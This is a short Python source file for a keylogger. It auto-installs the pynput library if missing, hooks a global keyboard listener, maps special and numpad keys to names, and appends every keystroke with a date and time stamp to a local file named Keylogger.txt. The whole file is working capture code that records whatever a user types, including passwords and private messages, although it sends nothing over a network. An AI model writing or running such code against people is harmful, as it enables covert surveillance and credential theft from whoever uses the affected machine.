import os
from datetime import datetime as dt
while True:
    try:
        from pynput import keyboard as kb
        break
    except ImportError:
        os.system("pip3 install pynput")

special_keys = {
    kb.Key.esc:"Escape", kb.Key.f1:"f1", kb.Key.f2:"f2", kb.Key.f3:"f3", kb.Key.f4:"f4",  kb.Key.f5:"f5",  kb.Key.f6:"f6",
    kb.Key.f7:"f7", kb.Key.f8:"f8", kb.Key.f9:"f9", kb.Key.f10:"f10", kb.Key.f11:"f11", kb.Key.f12:"f12", kb.Key.print_screen:"print screen",
    kb.Key.scroll_lock:"scroll lock", kb.Key.pause:"pause", kb.Key.backspace:"backspace", kb.Key.tab:"tab", kb.Key.enter:"enter",
    kb.Key.caps_lock:"caps lock", kb.Key.shift:"left shift", kb.Key.shift_r:"right shift", kb.Key.ctrl_l:"left ctrl", kb.Key.ctrl_r:"right ctrl",
    kb.Key.alt_l:"left alt", kb.Key.insert:"insert", kb.Key.home:"home", kb.Key.page_up:"page up", kb.Key.delete:"delete", kb.Key.end:"end",
    kb.Key.page_down:"page down", kb.Key.up:"up", kb.Key.down:"down", kb.Key.left:"left", kb.Key.right:"right", kb.Key.num_lock:"num lock",
    kb.Key.cmd_l:"left cmd", kb.Key.cmd_r:"right cmd", kb.Key.menu:"menu", kb.Key.media_next:"next media", kb.Key.media_play_pause:"play/pause media",
    kb.Key.alt_r:"right alt", kb.Key.space:"space", kb.Key.menu:"menu", kb.Key.alt_gr:"alt gr", kb.Key.media_previous:"previous media",
    kb.Key.media_volume_down:"volume down", kb.Key.media_volume_up:"volume up", kb.Key.media_volume_mute:"volume mute",
}

num_pad_values = list(range(96, 106))

def key_pressed(key):
    try:
        try:
            if key.vk in num_pad_values:
                key_value = key.vk - 96
                write_keylog(key_value)
                return
            key_value = key.char
            write_keylog(key_value)
        except:
            key_value = special_keys[key]
            write_keylog(key_value)
    except:
        pass

def write_keylog(keylog):
    with open("Keylogger.txt", "a") as f:
        f.write(f"[{dt.now().date()}] [{dt.now().time()}] \" {keylog} \"\n")


if __name__ == "__main__":
    listener = kb.Listener(on_press=key_pressed)
    listener.start()
    input()